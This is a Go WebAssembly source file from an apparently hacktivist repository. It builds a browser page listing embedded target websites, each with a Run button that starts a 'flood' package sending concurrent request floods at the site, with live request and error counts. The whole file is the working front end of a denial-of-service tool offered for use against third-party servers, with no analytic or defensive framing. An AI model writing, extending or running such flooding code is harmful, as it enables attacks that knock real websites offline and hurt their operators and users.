//go:build wasm
// +build wasm

package main

import (
	"context"
	_ "embed"
	"encoding/json"
	"fmt"
	"sync"
	"syscall/js"
	"time"

	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
)

type targetWrapper struct {
	*flood.Target
	cancel context.CancelFunc
}

var (
	//go:embed all.json
	targetJson []byte
	targetList []string
	targets    map[string]*targetWrapper = map[string]*targetWrapper{}
	lock       sync.Mutex
)

func main() {
	err := json.Unmarshal(targetJson, &targetList)
	if err != nil {
		println("Failed to initialize a target list: ", err)
		return
	}
	targetList[0] = "https://itohi.com"

	doc := js.Global().Get("document")
	root := doc.Call("getElementById", "targets")
	for i, name := range targetList {
		tr := doc.Call("createElement", "tr")
		style := tr.Get("style")
		if i%2 == 0 {
			style.Set("background", "#f0f0f0")
		}
		tr.Set("innerHTML", fmt.Sprintf(
			"<td>%s</td>"+
				"<td><div style='background:#e0e0e0'><div id='pb_%d' style='background:#a0e0a0;width:0%%'>&nbsp;</div></div></td>"+
				"<td id='eps_%d'></td>"+
				"<td id='rps_%d'></td>"+
				"<td><button id='btn_%d' onClick='runTarget(%d)'>Run</button></td>",
			name,
			i,
			i,
			i,
			i,
			i,
		))

		root.Call("appendChild", tr)
	}

	js.Global().Set("runTarget", js.FuncOf(runTarget))

	timer := time.NewTicker(time.Second * 3)
	for range timer.C {
		err, req := flood.Statistics()
		setProgress("total", req, err)
	}
}

func runTarget(this js.Value, jsTarget []js.Value) interface{} {
	target := jsTarget[0].Int()

	if target >= len(targetList) {
		return nil
	}
	name := targetList[target]
	wrapper, ok := targets[name]
	if !ok {
		runNewTarget(target, name)
	} else {
		wrapper.run(target, name)
	}
	return nil
}

func (t *targetWrapper) run(target int, name string) {
	lock.Lock()
	defer lock.Unlock()
	delete(targets, name)
	t.cancel()
	setState(target, false)
}

func runNewTarget(target int, name string) {
	lock.Lock()
	defer lock.Unlock()

	ctx, cancel := context.WithCancel(context.Background())
	targets[name] = &targetWrapper{
		Target: flood.New(name, ""),
		cancel: cancel,
	}

	cnt := 0
	go targets[name].Run(ctx, 10, func(requests, errors int64) {
		if cnt%3 == 0 {
			setProgress(fmt.Sprint(target), requests, errors)
		}
		cnt++
	})

	setState(target, true)
}

func setState(target int, running bool) {
	doc := js.Global().Get("document")
	btn := doc.Call("getElementById", fmt.Sprintf("btn_%d", target))
	style := btn.Get("style")
	if running {
		btn.Set("textContent", "Stop")
		style.Set("background", "lightblue")
	} else {
		btn.Set("textContent", "Run")
		style.Set("background", "lightgray")
	}
}

func setProgress(target string, requests, errors int64) {
	doc := js.Global().Get("document")
	doc.Call("getElementById", fmt.Sprintf("eps_%s", target)).Set("textContent", fmt.Sprint(errors))
	doc.Call("getElementById", fmt.Sprintf("rps_%s", target)).Set("textContent", fmt.Sprint(requests))
	ratio := float64(errors)
	if requests == 0 {
		ratio = 0
	} else {
		ratio /= float64(requests)
	}
	if ratio > 1 {
		ratio = 1
	} else if ratio < 0 {
		ratio = 0
	}
	ratio *= 100

	doc.Call("getElementById", fmt.Sprintf("rps_%s", target)).Set("textContent", fmt.Sprint(requests))

	style := doc.Call("getElementById", fmt.Sprintf("pb_%s", target)).Get("style")
	style.Set("width", fmt.Sprintf("%d%%", int(ratio)))
}
